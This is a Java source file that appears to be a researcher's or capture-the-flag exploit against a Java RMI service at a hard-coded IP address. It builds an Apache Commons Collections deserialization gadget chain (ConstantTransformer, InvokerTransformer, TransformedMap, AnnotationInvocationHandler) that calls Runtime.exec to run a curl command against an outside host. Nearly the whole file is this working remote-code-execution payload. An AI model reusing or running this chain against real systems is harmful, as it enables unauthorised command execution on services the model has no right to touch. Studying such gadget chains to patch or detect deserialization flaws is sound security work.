package com.kaibro.rmi;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

// exploit
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.util.HashMap;
import java.lang.reflect.Constructor;
import java.util.Map;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Client implements Serializable {

    public static void main(String[] args) {

        String host = "140.113.203.209";
        int port = 11099;
        try {
            Registry registry = LocateRegistry.getRegistry(host, port);
            RMIInterface stub = (RMIInterface) registry.lookup("Hello");
            String response = stub.getSecret();
            System.out.println("response: " + response);


            // exploit
           Transformer[] transformers = {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"curl https://bravo.nctu.me"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);

            Map map = new HashMap();
            map.put("value", "2");

            Map transformedmap = TransformedMap.decorate(map, null, transformerChain);


            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
            cons.setAccessible(true);

            Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);

            ByteArrayOutputStream exp = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(exp);
            oos.writeObject(ins);
            oos.flush();
            oos.close();

            ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(out);
            Object obj = (Object) ois.readObject();


        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
